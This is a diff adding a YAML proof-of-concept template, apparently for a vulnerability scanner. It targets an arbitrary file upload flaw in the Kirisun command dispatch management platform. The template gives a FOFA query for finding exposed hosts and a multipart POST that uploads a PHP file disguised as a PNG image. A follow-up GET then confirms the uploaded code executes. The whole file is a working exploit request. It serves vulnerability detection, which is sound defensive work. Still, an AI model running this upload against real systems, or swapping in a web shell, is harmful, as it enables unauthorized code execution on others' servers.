@@ -1,0 +1,31 @@
+id: poc-yaml-kirisun-zx-upload-anyfile-upload
+info:
+  name: 福建科立讯通信 指挥调度管理平台 zx_upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /custom/zx/upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+  data: '------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+
+    Content-Disposition: form-data; name="ulfile";filename="{{.t1}}.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /upload/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
